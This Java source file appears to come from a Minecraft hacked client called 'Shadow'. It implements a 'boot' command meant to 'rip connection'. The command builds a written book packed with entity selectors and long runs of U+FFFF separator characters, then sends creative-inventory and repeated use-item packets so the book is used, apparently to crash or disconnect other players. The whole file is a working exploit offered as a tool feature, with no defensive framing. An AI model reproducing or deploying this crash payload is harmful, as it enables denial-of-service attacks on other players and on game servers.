package net.shadow.feature.command;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;

public class BootCmd extends Command {
    public BootCmd() {
        super("boot", "rip connection");
    }

    @Override
    public void call(String[] args) {
        ItemStack boot = new ItemStack(Items.WRITTEN_BOOK, 1);
        try {
            boot.setNbt(StringNbtReader.parse("{title:\"bomb\",author:\"_0x150\",pages:['[{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"}]']}"));
        } catch (CommandSyntaxException ignored) {
        }
        NotificationSystem.notifications.add(new Notification("Booter", "Booting Players", 150));
        Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(Shadow.c.player.getInventory().selectedSlot + 36, boot));
        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
    }
}
